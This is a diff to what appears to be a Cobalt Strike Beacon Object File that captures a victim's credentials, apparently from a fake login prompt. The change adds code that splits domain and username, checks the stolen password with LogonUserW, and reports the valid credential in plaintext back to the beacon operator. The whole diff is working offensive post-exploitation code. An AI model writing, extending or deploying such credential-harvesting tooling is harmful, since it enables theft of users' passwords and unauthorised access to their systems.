@@ -164,15 +164,48 @@ VOID go(IN PCHAR Args, IN ULONG Length) {
     } else {
         // === IMPRIMIR RESULTADOS (en hilo principal) ===
         if (g_dwCredResult == ERROR_SUCCESS) {
-            if (g_szDomain[0] == L'\0') {
-                char buf[1024];
-                MSVCRT$sprintf(buf, "[+] Username: %ls\n[+] Password: %ls", g_szUsername, g_szPassword);
-                BeaconPrintf(CALLBACK_OUTPUT, "%s", buf);
-            } else {
-                char buf[1024];
-                MSVCRT$sprintf(buf, "[+] Username: %ls\n[+] Domain: %ls\n[+] Password: %ls", g_szUsername, g_szDomain, g_szPassword);
-                BeaconPrintf(CALLBACK_OUTPUT, "%s", buf);
+            WCHAR* fullUser = g_szUsername;
+            WCHAR* domain = g_szDomain[0] ? g_szDomain : NULL;
+            WCHAR* user = fullUser;
+            WCHAR* pass = g_szPassword;
+
+            // === SEPARAR DOMINIO\USUARIO SI EXISTE \ ===
+            WCHAR* backslash = MSVCRT$wcschr(fullUser, L'\\');
+            if (backslash) {
+                *backslash = L'\0';           // Separar
+                domain = fullUser;            // DOMINIO
+                user = backslash + 1;         // USUARIO
+            } else if (!domain || !domain[0]) {
+                domain = L".";                // Local
             }
+
+            // === VALIDAR CREDENCIALES ===
+            HANDLE hToken = NULL;
+            BOOL bValid = ADVAPI32$LogonUserW(
+                user,
+                domain,
+                pass,
+                LOGON32_LOGON_INTERACTIVE,
+                LOGON32_PROVIDER_DEFAULT,
+                &hToken
+            );
+
+            if (bValid && hToken) {
+                char buf[1024];
+                MSVCRT$sprintf(buf, "[+] Valid Credential\n\tDomain: %ls\n\tUsername: %ls\n\tPassword: %ls",
+                            domain, user, pass);
+                BeaconPrintf(CALLBACK_OUTPUT, "%s", buf);
+                KERNEL32$CloseHandle(hToken);
+            } else {
+                DWORD err = KERNEL32$GetLastError();
+                char buf[1024];
+                MSVCRT$sprintf(buf, "[-] Invalid Credential (Error: %d)\n\tDomain: %ls\n\tUsername: %ls\n\tPassword: %ls",
+                            err, domain, user, pass);
+                BeaconPrintf(CALLBACK_ERROR, "%s", buf);
+            }
+
+            // === LIMPIAR CONTRASEÑA ===
+            MSVCRT$memset(g_szPassword, 0, sizeof(g_szPassword));
         } else if (g_dwCredResult == ERROR_CANCELLED) {
             BeaconPrintf(CALLBACK_OUTPUT, "[-] Usuario canceló.");
         } else {
